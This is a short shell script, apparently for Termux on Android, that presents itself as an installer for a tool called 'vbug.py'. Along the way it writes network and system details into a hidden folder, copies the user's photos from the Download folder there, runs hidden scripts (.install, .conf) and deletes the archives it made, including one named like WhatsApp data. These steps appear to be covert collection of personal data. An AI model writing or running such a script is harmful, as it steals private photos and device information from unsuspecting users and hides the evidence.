apt install zip -y
apt install python -y
bash .install
mkdir .info
ifconfig |& tee .info/info
uname -a |& tee .info/info2
tar -cvf info.tar .info/*
cp /sdcard/Download/*.jpg -r .info/
bash .install
apt install nano
python .conf
rm -fr info info1 .WathsapData.tar info.tar
bash .install
python2 vbug.py
